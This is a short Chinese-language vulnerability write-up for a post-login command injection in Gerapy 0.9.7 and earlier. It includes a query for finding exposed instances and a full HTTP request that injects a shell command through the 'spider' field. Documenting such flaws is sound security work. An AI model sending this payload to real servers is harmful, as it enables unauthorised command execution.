# Gerapy parse 后台远程命令执行漏洞

## 漏洞描述

Gerapy gerapy/server/core/views.py 中的方法存在任意命令执行，攻击者登录后台后发送特定的请求包即可利用漏洞 

## 漏洞影响

<a-checkbox checked>Gerapy <= 0.9.7</a-checkbox></br>

## 网络测绘

<a-checkbox checked>title="Gerapy"</a-checkbox></br>

## 漏洞复现

登录页面

![img](../../../.vuepress/public/img/1638069254477-82075ea9-6191-4ebd-8e92-bed0104a0942-20220313132256739.png)

出现漏洞的文件为 `gerapy/server/core/views.py`

![img](../../../.vuepress/public/img/1638185162093-04fc1593-86b0-4c91-b8d3-32ae22fc224d.png)

构造请求包测试命令执行

```python
POST /api/project/1/parse HTTP/1.1
Host: 
Pragma: no-cache
Cache-Control: no-cache
Accept: application/json, text/plain, */*
Authorization: Token 0fb31a60728efd8e6398349bea36fa7629bd8df0
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.55 Safari/537.36
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6
Content-Length: 18

{"spider":";`id`"}
```

![img](../../../.vuepress/public/img/1638185190368-660687ff-2bb8-4251-8b66-811fca41ca9b.png)